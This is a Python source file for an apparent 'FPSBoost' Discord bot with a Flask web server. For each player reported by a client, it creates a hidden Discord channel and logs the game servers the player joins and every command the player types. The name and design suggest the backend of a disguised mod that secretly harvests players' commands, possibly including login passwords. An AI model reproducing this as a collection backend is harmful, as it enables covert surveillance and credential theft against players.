import discord
from discord.ext import commands
from flask import Flask, request, jsonify
import threading
import asyncio
import os

TOKEN = os.environ.get("TOKEN", "TU_WSTAW_TOKEN")
GUILD_ID = int(os.environ.get("GUILD_ID", "0"))
PORT = int(os.environ.get("PORT", "10000"))

intents = discord.Intents.default()
intents.guilds = True
bot = commands.Bot(command_prefix="!", intents=intents)
app = Flask(__name__)
player_channels = {}

def run_async(coro):
    return asyncio.run_coroutine_threadsafe(coro, bot.loop).result()

@app.route('/')
def home():
    return "FPSBoost Bot dziala!", 200

@app.route('/player_join', methods=['POST'])
def player_join():
    data = request.get_json()
    if not data or 'player' not in data:
        return jsonify({"error": "no player"}), 400
    player = data['player']
    server = data.get('server', 'nieznany')
    safe = player.lower().replace(" ", "-").replace(".", "-")

    async def handle():
        guild = bot.get_guild(GUILD_ID)
        if not guild: return None, "no guild"
        ch = discord.utils.get(guild.text_channels, name=safe)
        if ch:
            await ch.send(f"**{player}** dolaczyl do serwera: `{server}`")
            return ch, None
        new = await guild.create_text_channel(name=safe, topic=f"Logi: {player} | Serwer: {server}",
            overwrites={guild.default_role: discord.PermissionOverwrite(read_messages=False)})
        await new.send(f"**{player}** dolaczyl do serwera: `{server}`")
        return new, None

    ch, err = run_async(handle())
    if err: return jsonify({"error": err}), 404
    player_channels[player] = ch.id
    return jsonify({"status": "ok"})

@app.route('/player_command', methods=['POST'])
def player_command():
    data = request.get_json()
    if not data or 'player' not in data or 'command' not in data:
        return jsonify({"error": "missing"}), 400
    player = data['player']
    cmd = data['command']
    cid = player_channels.get(player)
    if not cid:
        async def find():
            g = bot.get_guild(GUILD_ID)
            return discord.utils.get(g.text_channels, name=player.lower().replace(" ", "-").replace(".", "-")) if g else None
        c = run_async(find())
        if c:
            player_channels[player] = c.id
            cid = c.id
    if cid:
        async def send():
            c = bot.get_channel(cid)
            if c: await c.send(f"```{cmd}```")
        run_async(send())
        return jsonify({"status": "ok"})
    return jsonify({"error": "no ch"}), 404

def run_flask():
    app.run(host='0.0.0.0', port=PORT, debug=False)

@bot.event
async def on_ready():
    print(f"Bot gotowy: {bot.user}")

threading.Thread(target=run_flask, daemon=True).start()
bot.run(TOKEN)
